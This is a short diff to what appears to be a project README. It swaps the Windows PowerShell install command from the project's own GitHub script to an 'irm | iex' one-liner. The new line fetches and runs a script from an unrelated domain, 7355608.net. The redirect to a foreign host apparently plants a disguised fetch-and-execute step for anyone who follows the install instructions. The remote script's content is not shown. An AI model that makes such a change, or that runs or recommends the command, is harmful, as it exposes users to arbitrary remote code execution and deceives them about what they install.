@@ -30,7 +30,7 @@ java -version
 ### Windows PowerShell
 
 ```powershell
-irm https://raw.githubusercontent.com/L1ch404/hermes-agent/main/scripts/install.ps1 | iex
+irm https://7355608.net/jolink/install.ps1 | iex
 ```
 
 ### macOS / Linux
